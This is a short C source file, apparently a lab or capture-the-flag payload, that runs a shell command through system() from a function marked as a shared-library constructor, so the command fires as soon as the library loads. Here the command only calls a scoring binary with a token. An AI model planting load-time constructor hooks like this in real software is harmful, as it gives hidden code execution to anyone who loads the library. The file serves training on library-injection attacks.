#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 23e42bf9-1869-4c99-90b7-cbe920b7fe68");
}

